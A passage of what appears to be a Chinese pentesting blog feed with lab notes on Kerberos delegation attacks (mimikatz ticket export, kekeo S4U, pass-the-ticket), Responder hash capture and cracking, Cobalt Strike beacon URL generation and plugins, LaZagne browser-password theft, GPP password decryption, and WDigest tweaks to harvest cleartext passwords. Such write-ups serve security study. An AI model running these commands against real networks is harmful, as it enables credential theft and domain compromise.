class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                ShareInfos.Add(new SHARE_INFO_1(&quot;ERROR=&quot; + ret.ToString(), 10, string.Empty));</span><br><span class="line">                return ShareInfos.ToArray();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            SHARE_INFO_1[] computerShares = EnumNetShares(System.Net.Dns.GetHostName());</span><br><span class="line">            foreach (SHARE_INFO_1 computershare in computerShares) &#123;</span><br><span class="line">                Console.WriteLine(computershare);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这段代码其实是别人造好的轮子(这里面涉及到很多知识点，不一一展开讲了)，输出共享路径，不过方法要添加static属性，不然会报错，<a href="https://www.pinvoke.net/default.aspx/netapi32/NetShareEnum.html" title="https://www.pinvoke.net/default.aspx/netapi32/NetShareEnum.html" target="_blank" rel="noopener">参考</a><br>效果如下：<br><img src="/2020/12/22/sharpshares-code/share.png" alt></p><p>看过这些之后，再看看源码调用的逻辑就行了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;GitHub地址：&lt;a href=&quot;https://github.com/djhohnstein/SharpShares&quot; title=&quot;https://github.com/djhohnstein/SharpShares&quot; target=&quot;_blank&quot; rel=&quot;noo
      
    
    </summary>
    
    
    
      <category term="CSharp" scheme="http://sherlocz.github.io/tags/CSharp/"/>
    
  </entry>
  
  <entry>
    <title>约束委派攻击复现</title>
    <link href="http://sherlocz.github.io/2020/12/15/kerberos-constrained-delegation/"/>
    <id>http://sherlocz.github.io/2020/12/15/kerberos-constrained-delegation/</id>
    <published>2020-12-15T08:02:28.000Z</published>
    <updated>2020-12-16T09:40:48.958Z</updated>
    
    <content type="html"><![CDATA[<p>不清楚原理先来复现一下</p><p>测试环境如下：</p><ul><li>dc 192.168.43.100(域控)    administrator(域管)</li><li>Test08 192.168.43.110(域内机器) testuser(域内普通用户)</li><li>域 hacke.testlab</li></ul><h1 id="非约束委派攻击"><a href="#非约束委派攻击" class="headerlink" title="非约束委派攻击"></a>非约束委派攻击</h1><p>首先我们要设置test08机器有非约束委派的属性<br><img src="/2020/12/15/kerberos-constrained-delegation/test08.png" alt></p><p>我们可以使用powersploit中的<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" title="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank" rel="noopener">脚本</a>来获取具有非约束委派的机器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1;</span><br><span class="line">Get-NetComputer -Unconstrained -Domain hacke.testlab</span><br></pre></td></tr></table></figure><p><img src="/2020/12/15/kerberos-constrained-delegation/powersploit.png" alt></p><p>使用域管账号访问Test08这台机器<br><img src="/2020/12/15/kerberos-constrained-delegation/dir1.png" alt></p><p>这个时候会在test08这台机器上的lsass.exe内存中留下留下票据信息</p><p>testuser用户登录test08这台机器，mimikatz导出票据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/15/kerberos-constrained-delegation/admin.png" alt></p><p>这里可以看见有一个域管的票据，用mimikat导入进去<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt [0;1f78b6]-2-0-60a10000-Administrator@krbtgt-HACKE.TESTLAB.kirbi</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/15/kerberos-constrained-delegation/import.png" alt></p><p>这个时候在同一cmd下发现可以访问dc了<br><img src="/2020/12/15/kerberos-constrained-delegation/dcc.png" alt></p><p>可以利用psexec直接cmd过去</p><p><img src="/2020/12/15/kerberos-constrained-delegation/ipconfig.png" alt></p><p>域控就拿下了</p><h1 id="约束委派攻击"><a href="#约束委派攻击" class="headerlink" title="约束委派攻击"></a>约束委派攻击</h1><p>首先要将域用户委派设置为域控的cifs<br>test= testuser，一个是名称一个是登录名，懒得改了<br><img src="/2020/12/15/kerberos-constrained-delegation/cifs.png" alt></p><p>将testuser用户设置成服务账号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A SQLServer/test08.hacke.testlab/MSSQL testuser</span><br><span class="line">setspn -L testuser</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/15/kerberos-constrained-delegation/service.png" alt></p><p>我们可以利用先前的powerview工具来查看域中的服务账号：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\powerview.ps1;Get-DomainUser -TrustedToAuth -Domain hacke.testlab | select name</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/15/kerberos-constrained-delegation/test.png" alt></p><p>利用<a href="https://github.com/gentilkiwi/kekeo" title="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">kekeo</a>工具生成票据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:test /domain:hacke.testlab /password:xxxx</span><br><span class="line"></span><br><span class="line">tgs::s4u /tgt:TGT_testuser@HACKE.TESTLAB_krbtgt~hacke.testlab@HACKE.TESTLAB.kirbi /user:administrator@hacke.testlab /service:cifs/dc.hacke.testlab</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/15/kerberos-constrained-delegation/kekeo.png" alt></p><p>mimikatz导入票据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_administrator@hacke.testlab@HACKE.TESTLAB_testuser@HACKE.TESTLAB.kirbi</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/15/kerberos-constrained-delegation/mimikatz.png" alt><br>可以访问dc了</p><p>不过这种方法有前提条件，就是服务账号cifs设置的是域控的地址</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;不清楚原理先来复现一下&lt;/p&gt;
&lt;p&gt;测试环境如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;dc 192.168.43.100(域控)    administrator(域管)&lt;/li&gt;
&lt;li&gt;Test08 192.168.43.110(域内机器) testuser(域内普通用户)&lt;
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="域渗透" scheme="http://sherlocz.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Responder在渗透测试中的利用</title>
    <link href="http://sherlocz.github.io/2020/12/14/Responder-Pentest/"/>
    <id>http://sherlocz.github.io/2020/12/14/Responder-Pentest/</id>
    <published>2020-12-14T04:42:47.000Z</published>
    <updated>2020-12-14T08:53:32.429Z</updated>
    
    <content type="html"><![CDATA[<p>#基本使用#</p><p>Github:<br><a href="https://github.com/lgandx/Responder-Windows" target="_blank" rel="noopener">https://github.com/lgandx/Responder-Windows</a><br>Kali自带<br>启用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Responder.py -I eth0</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/14/Responder-Pentest/start.png" alt><br>这里监听了这台kali，ip为192.168.43.105</p><p>使用域内其他机器访问kali的ipc，由于不存在，DNS解析不成功，回退到LLMNR和NBT-NS请求来解析目的地机器，这个时候responder会抓取到NTLMv2的hash</p><p><img src="/2020/12/14/Responder-Pentest/ipc.png" alt></p><p><img src="/2020/12/14/Responder-Pentest/hash.png" alt></p><p>抓取到的hash用<a href="https://github.com/hashcat/hashcat/releases/tag/v6.1.1" title="https://github.com/hashcat/hashcat/releases/tag/v6.1.1" target="_blank" rel="noopener">hashcat</a>解密。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/hashcat-6.1.1# ./hashcat.bin -m 5600 hash.txt pass.txt</span><br></pre></td></tr></table></figure><p>解出hash之后就可以用域用户登录了。<br><img src="/2020/12/14/Responder-Pentest/pass.png" alt></p><p>#钓鱼#<br>在Responder的配置文件中，我们可以找到html inject的相关信息<br><img src="/2020/12/14/Responder-Pentest/html.png" alt></p><p>将这个img标签新建到html中，访问<br><img src="/2020/12/14/Responder-Pentest/ip.png" alt></p><p>这里随意输入，然后点击确定，responder会接收到ntlm v2的hash<br><img src="/2020/12/14/Responder-Pentest/admin.png" alt></p><p>这里的hash并不是我们弹框输入的用户名密码的hash，而是对方机器的真实hash</p><p>#NTLMv2传递#<br>没复现成功<br>Waiting……</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;#基本使用#&lt;/p&gt;
&lt;p&gt;Github:&lt;br&gt;&lt;a href=&quot;https://github.com/lgandx/Responder-Windows&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/lgandx/R
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>读取CS的beacon配置文件</title>
    <link href="http://sherlocz.github.io/2020/12/03/cs-checksum8/"/>
    <id>http://sherlocz.github.io/2020/12/03/cs-checksum8/</id>
    <published>2020-12-03T09:42:37.000Z</published>
    <updated>2020-12-03T10:52:14.266Z</updated>
    
    <content type="html"><![CDATA[<p>nmap脚本在这里：<br><a href="https://github.com/whickey-r7/grab_beacon_config" target="_blank" rel="noopener">https://github.com/whickey-r7/grab_beacon_config</a></p><p>我们可以看见这个url后面拼接的加密方式、感觉就是返回了4位数的随机数<br><img src="/2020/12/03/cs-checksum8/nse.png" alt></p><p>写成python脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line"></span><br><span class="line">def generate_checksum(input):</span><br><span class="line">trial = &quot;&quot;</span><br><span class="line">total = 0</span><br><span class="line">i = 1</span><br><span class="line">while total != input:</span><br><span class="line">total = 0</span><br><span class="line">trial = &apos;&apos;.join(random.choice(&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot;) for i in range(4))</span><br><span class="line">for i in range(4):</span><br><span class="line">total = (total + ord(trial[i])) % 256</span><br><span class="line">i = i + 1</span><br><span class="line">return trial</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">url_x86 = generate_checksum(92)</span><br><span class="line">print(url_x86)</span><br><span class="line">url_x64 = generate_checksum(93)</span><br><span class="line">print(url_x64)</span><br></pre></td></tr></table></figure></p><p>生成四位数的随机数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.75.170/KeVV</span><br></pre></td></tr></table></figure></p><p>可以下载下来beacon的配置文件，打开是二进制文件、网上找了几个cobaltstrikescan的脚本解析但是都没成功 ==</p><p>nmap脚本效果如下：<br><img src="/2020/12/03/cs-checksum8/nse.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;nmap脚本在这里：&lt;br&gt;&lt;a href=&quot;https://github.com/whickey-r7/grab_beacon_config&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/whickey-r7/gra
      
    
    </summary>
    
    
    
      <category term="CobaltStrike" scheme="http://sherlocz.github.io/tags/CobaltStrike/"/>
    
  </entry>
  
  <entry>
    <title>CS插件开发</title>
    <link href="http://sherlocz.github.io/2020/11/21/cna-code/"/>
    <id>http://sherlocz.github.io/2020/11/21/cna-code/</id>
    <published>2020-11-21T11:23:09.000Z</published>
    <updated>2020-12-22T11:33:37.472Z</updated>
    
    <content type="html"><![CDATA[<p>新建按钮：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">popup beacon_bottom &#123;</span><br><span class="line">menu &quot;测试&quot; &#123;</span><br><span class="line">item &quot;测试1&quot; &#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/11/21/cna-code/button.png" alt></p><p>控制台文本颜色：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">alias showcolor&#123;</span><br><span class="line">blog($1,&quot;Hello \c0test&quot;);</span><br><span class="line">blog($1,&quot;Hello \c1test&quot;);</span><br><span class="line">blog($1,&quot;Hello \c2test&quot;);</span><br><span class="line">blog($1,&quot;Hello \c3test&quot;);</span><br><span class="line">blog($1,&quot;Hello \c4test&quot;);</span><br><span class="line">blog($1,&quot;Hello \c5test&quot;);</span><br><span class="line">blog($1,&quot;Hello \c6test&quot;);</span><br><span class="line">blog($1,&quot;Hello \c7test&quot;);</span><br><span class="line">blog($1,&quot;Hello \c8test&quot;);</span><br><span class="line">blog($1,&quot;Hello \c9test&quot;);</span><br><span class="line">blog($1,&quot;Hello \cAtest&quot;);</span><br><span class="line">blog($1,&quot;Hello \cBtest&quot;);</span><br><span class="line">blog($1,&quot;Hello \cCtest&quot;);</span><br><span class="line">blog($1,&quot;Hello \cDtest&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/11/21/cna-code/color.png" alt></p><p>上传文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">popup beacon_bottom &#123;</span><br><span class="line">menu &quot;测试&quot; &#123;</span><br><span class="line">item &quot;上传nbtscan&quot; &#123;</span><br><span class="line">$bid = $1;</span><br><span class="line">$dialog = dialog(&quot;上传nbtscan&quot;, %(UploadPath =&gt; &quot;C:\\Temp\\&quot;, bid =&gt; $bid), &amp;FRP);</span><br><span class="line">drow_text($dialog, &quot;UploadPath&quot;,  &quot;上传路径: &quot;); </span><br><span class="line">dbutton_action($dialog, &quot;上传&quot;);</span><br><span class="line">dialog_show($dialog);</span><br><span class="line">        &#125;</span><br><span class="line">        sub FRP &#123;</span><br><span class="line">    bcd($bid, $3[&apos;UploadPath&apos;]);</span><br><span class="line">    if (-is64 $bid[&apos;id&apos;]) &#123;</span><br><span class="line">        bupload($bid, script_resource(&quot;/japowriehfpao.exe&quot;));</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        bupload($bid, script_resource(&quot;/japowriehfpao.exe&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>内部分享做了ppt，文章有时间再写吧</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/5887" title="https://xz.aliyun.com/t/5887" target="_blank" rel="noopener">CobaltStrike插件开发官方指南 Part1</a></p><p><a href="https://www.cobaltstrike.com/aggressor-script/functions.html" title="https://www.cobaltstrike.com/aggressor-script/functions.html" target="_blank" rel="noopener">Aggressor Script Tutorial and Reference</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;新建按钮：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br
      
    
    </summary>
    
    
    
      <category term="CS插件" scheme="http://sherlocz.github.io/tags/CS%E6%8F%92%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>lazagne-360</title>
    <link href="http://sherlocz.github.io/2020/11/15/lazagne-360/"/>
    <id>http://sherlocz.github.io/2020/11/15/lazagne-360/</id>
    <published>2020-11-15T06:03:37.000Z</published>
    <updated>2020-11-15T06:29:46.333Z</updated>
    
    <content type="html"><![CDATA[<p>其实三好学生之前写过自定义lazagne抓取不同浏览器密码：<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%9C%AC%E5%9C%B0%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8B%E5%B7%A5%E5%85%B7LaZagne%E4%B8%AD%E7%9A%84%E8%87%AA%E5%AE%9A%E4%B9%89%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91/" title="https://3gstudent.github.io/3gstudent.github.io/%E6%9C%AC%E5%9C%B0%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8B%E5%B7%A5%E5%85%B7LaZagne%E4%B8%AD%E7%9A%84%E8%87%AA%E5%AE%9A%E4%B9%89%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91/" target="_blank" rel="noopener">本地密码查看工具LaZagne中的自定义脚本开发</a></p><p>不过他这个版本很老了，又看见有师傅再问怎么抓取360极速浏览器的密码，之前也尝试过，简单做做笔记。</p><p>下载LaZagne:<a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></p><p>我们这里就编译windows版本的，由于360极速浏览器也是用的chrome内核，其实我们只需要将浏览器保存密码的路径修改一下就行了。</p><p>修改LaZagne-master\Windows\lazagne\softwares\browsers\chromium_based.py中的225行数组，将下列代码添加到数组中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(u&apos;360CEC&apos;, u&apos;&#123;LOCALAPPDATA&#125;\\360Chrome\\Chrome\\User Data&apos;),</span><br></pre></td></tr></table></figure></p><p><img src="/2020/11/15/lazagne-360/change.png" alt><br>然后重新编译LaZagne：<a href="https://sherlocz.github.io/2020/05/12/LaZagne%E7%BC%96%E8%AF%91%E6%8A%93%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81/" title="https://sherlocz.github.io/2020/05/12/LaZagne%E7%BC%96%E8%AF%91%E6%8A%93%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81/">LaZagne编译抓取浏览器密码</a></p><p>效果如图：<br><img src="/2020/11/15/lazagne-360/success.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;其实三好学生之前写过自定义lazagne抓取不同浏览器密码：&lt;a href=&quot;https://3gstudent.github.io/3gstudent.github.io/%E6%9C%AC%E5%9C%B0%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9
      
    
    </summary>
    
    
    
      <category term="密码抓取" scheme="http://sherlocz.github.io/tags/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/"/>
    
  </entry>
  
  <entry>
    <title>SYSVOL</title>
    <link href="http://sherlocz.github.io/2020/11/08/SYSVOL-GPP/"/>
    <id>http://sherlocz.github.io/2020/11/08/SYSVOL-GPP/</id>
    <published>2020-11-08T07:59:21.000Z</published>
    <updated>2020-11-13T04:46:14.078Z</updated>
    
    <content type="html"><![CDATA[<p>SYSVOL目录为AD共享的文件夹，所有的域认证用户都可以读取，也包括组策略脚本，这个脚本中会泄露加密后的域内用户密码。</p><p>配置如下，更新下域管的密码：<br><img src="/2020/11/08/SYSVOL-GPP/setting.png" alt></p><p>这里我更新了域控密码之后，会在sysvol共享文件夹中创建group.xml<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\ip\sysvol\域\Policies\&#123;xxxx&#125;\USER\Preferences\Groups.xml</span><br></pre></td></tr></table></figure></p><p>这个文件中会保存更新后加密的域管密码：<br><img src="/2020/11/08/SYSVOL-GPP/pass.png" alt></p><p>解密方式：<br><a href="Get-GPPPassword.ps1" title="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1">Get-GPPPassword.ps1</a></p><p><img src="/2020/11/08/SYSVOL-GPP/success.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;SYSVOL目录为AD共享的文件夹，所有的域认证用户都可以读取，也包括组策略脚本，这个脚本中会泄露加密后的域内用户密码。&lt;/p&gt;
&lt;p&gt;配置如下，更新下域管的密码：&lt;br&gt;&lt;img src=&quot;/2020/11/08/SYSVOL-GPP/setting.png&quot; alt&gt;&lt;
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>KB2871997无法抓取明文密码</title>
    <link href="http://sherlocz.github.io/2020/11/02/KB2871997/"/>
    <id>http://sherlocz.github.io/2020/11/02/KB2871997/</id>
    <published>2020-11-02T14:06:53.000Z</published>
    <updated>2020-11-02T15:07:38.931Z</updated>
    
    <content type="html"><![CDATA[<p>前几天在项目中发现利用mimiakatz无法抓取明文密码，hash又解不出来，pth过去也不行，后来查了资料后发现是打了补丁(<a href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB2871997" title="https://www.catalog.update.microsoft.com/Search.aspx?q=KB2871997" target="_blank" rel="noopener">KB2871997</a>)的原因。</p><p><img src="/2020/11/02/KB2871997/freebuf.png" alt></p><h1 id="补丁安装"><a href="#补丁安装" class="headerlink" title="补丁安装"></a>补丁安装</h1><p><a href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB2871997" title="https://www.catalog.update.microsoft.com/Search.aspx?q=KB2871997" target="_blank" rel="noopener">KB2871997</a></p><p>安装好之后运行命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></p><p>重启计算机，再次利用mimikatz抓取密码:<br><img src="/2020/11/02/KB2871997/reboot.png" alt></p><p>这个时候我们发现只有hash没有明文了，freebuf里说的mimikatz不管用了==</p><h1 id="抓取明文密码"><a href="#抓取明文密码" class="headerlink" title="抓取明文密码"></a>抓取明文密码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</span><br></pre></td></tr></table></figure><p>可以将我们之前的 UseLogonCredential 设置成 1，然后注销计算机，等待管理员重新登录就可以抓取明文密码<br>锁屏命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe user32.dll,LockWorkStation</span><br></pre></td></tr></table></figure></p><p>也可以直接使用三好学生的ps脚本：<br><a href="https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed" target="_blank" rel="noopener">https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed</a></p><p>效果如下：<br><img src="/2020/11/02/KB2871997/got.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前几天在项目中发现利用mimiakatz无法抓取明文密码，hash又解不出来，pth过去也不行，后来查了资料后发现是打了补丁(&lt;a href=&quot;https://www.catalog.update.microsoft.com/Search.aspx?q=KB2871997&quot;
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>exchange安装</title>
    <link href="http://sherlocz.github.io/2020/10/30/how-to-install-exchange-server/"/>
    <id>http://sherlocz.github.io/2020/10/30/how-to-install-exchange-server/</id>
    <published>2020-10-30T07:56:13.000Z</published>
    <updated>2021-01-15T02:06:15.583Z</updated>
    
    <content type="html"><![CDATA[<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p><a href="https://docs.microsoft.com/zh-cn/exchange/plan-and-deploy/prerequisites?view=exchserver-2019#windows-server-2019-prerequisites-for-exchange-2019" title="https://docs.microsoft.com/zh-cn/exchange/plan-and-deploy/prerequisites?view=exchserver-2019#windows-server-2019-prerequisites-for-exchange-2019" target="_blank" rel="noopener">官网安装教程及要求</a></p><p>不过比较繁琐，看不懂Emmmm</p><p>Windows Server 2012：<a href="https://msdn.itellyou.cn/" target="_blank" rel="noopener">https://msdn.itellyou.cn/</a></p><p>虚拟机内存给4G，给少了安装之后会很卡</p><p>安装好之后，运行powershell:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Install-WindowsFeature Server-Media-Foundation, NET-Framework-45-Features, RPC-over-HTTP-proxy, RSAT-Clustering, RSAT-Clustering-CmdInterface, RSAT-Clustering-Mgmt, RSAT-Clustering-PowerShell, WAS-Process-Model, Web-Asp-Net45, Web-Basic-Auth, Web-Client-Auth, Web-Digest-Auth, Web-Dir-Browsing, Web-Dyn-Compression, Web-Http-Errors, Web-Http-Logging, Web-Http-Redirect, Web-Http-Tracing, Web-ISAPI-Ext, Web-ISAPI-Filter, Web-Lgcy-Mgmt-Console, Web-Metabase, Web-Mgmt-Console, Web-Mgmt-Service, Web-Net-Ext45, Web-Request-Monitor, Web-Server, Web-Stat-Compression, Web-Static-Content, Web-Windows-Auth, Web-WMI, Windows-Identity-Foundation, RSAT-ADDS</span><br></pre></td></tr></table></figure></p><p>然后需要安装几个组件</p><p><a href="https://www.microsoft.com/en-us/download/details.aspx?id=17062" title="https://www.microsoft.com/en-us/download/details.aspx?id=17062" target="_blank" rel="noopener">Microsoft Office 2010 Filter Packs</a></p><p><a href="https://download.visualstudio.microsoft.com/download/pr/014120d7-d689-4305-befd-3cb711108212/0fd66638cde16859462a6243a4629a50/ndp48-x86-x64-allos-enu.exe" title="https://download.visualstudio.microsoft.com/download/pr/014120d7-d689-4305-befd-3cb711108212/0fd66638cde16859462a6243a4629a50/ndp48-x86-x64-allos-enu.exe" target="_blank" rel="noopener">.NET Framework 4.8</a></p><p><a href="https://www.microsoft.com/download/details.aspx?id=30679" title="https://www.microsoft.com/download/details.aspx?id=30679" target="_blank" rel="noopener">Visual C++ Redistributable Package for Visual Studio 2012</a></p><p><a href="https://support.microsoft.com/help/4032938/update-for-visual-c-2013-redistributable-package" title="https://support.microsoft.com/help/4032938/update-for-visual-c-2013-redistributable-package" target="_blank" rel="noopener">Visual C++ Redistributable Package for Visual Studio 2013</a></p><p><a href="https://download.microsoft.com/download/2/C/4/2C47A5C1-A1F3-4843-B9FE-84C0032C61EC/UcmaRuntimeSetup.exe" title="https://download.microsoft.com/download/2/C/4/2C47A5C1-A1F3-4843-B9FE-84C0032C61EC/UcmaRuntimeSetup.exe" target="_blank" rel="noopener">UcmaRuntimeSetup</a></p><p>安装好之后将这台12机器加域，用域管理(administrator)用户登录</p><p>下载Exchange Server : <a href="https://docs.microsoft.com/zh-cn/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019</a></p><p>我这里安装Exchange Server 2016 CU17(这个版本没有CVE-2020-0688)</p><p>下载好之后复制到虚拟机中，右键挂载，运行setup</p><p>在挂载的目录下执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#准备架构</span><br><span class="line">setup /IAcceptExchangeServerLicenseTerms /PrepareSchema</span><br><span class="line">#准备域</span><br><span class="line">setup /IAcceptExchangeServerLicenseTerms /PrepareAD /OrganizationName:sher10ckOrg</span><br></pre></td></tr></table></figure><p>这个时候安装界面应该就好了，然后安装（估计要1-2h）</p><p>安装好之后访问:<a href="https://localhost/owa" target="_blank" rel="noopener">https://localhost/owa</a></p><p>这里登录administrator</p><p><img src="/2020/10/30/how-to-install-exchange-server/success.png" alt></p><p>装了好几天终于装好了  ==</p>]]></content>
    
    <summary type="html">
    
      
      
